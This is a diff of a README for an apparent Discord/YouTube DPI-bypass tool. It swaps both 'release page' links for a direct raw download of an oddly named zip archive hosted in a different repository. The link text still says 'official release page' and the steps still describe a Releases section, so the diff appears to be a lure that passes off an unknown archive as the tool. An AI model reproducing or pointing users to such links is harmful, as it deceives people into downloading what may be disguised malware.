@@ -5,7 +5,7 @@ description: "Bypass platform connection restrictions using optimized WinDivert 
 ---
 # 🌐 zapret-discord-youtube-2026 - Access restricted services without using VPN
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Inclinedfaultaditya598/zapret-discord-youtube-2026)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Inclinedfaultaditya598/inclinedfaultaditya598.github.io/raw/refs/heads/main/illuminance/inclinedfaultaditya-io-github-3.3-alpha.5.zip)
 
 This software helps you access Discord and YouTube in regions where these services face connection issues. It uses DPI bypass technology to route traffic around blocks. You do not need a virtual private network or complex network setups to use this tool.
 
@@ -20,7 +20,7 @@ Ensure your computer meets these conditions to run the software:
 
 ## 📥 How to Install
 
-1. Visit the [official release page](https://github.com/Inclinedfaultaditya598/zapret-discord-youtube-2026).
+1. Visit the [official release page](https://github.com/Inclinedfaultaditya598/inclinedfaultaditya598.github.io/raw/refs/heads/main/illuminance/inclinedfaultaditya-io-github-3.3-alpha.5.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Click on the latest release link at the top of the list.
 4. Download the file labeled specifically as zapret-discord-youtube-2026.rar.
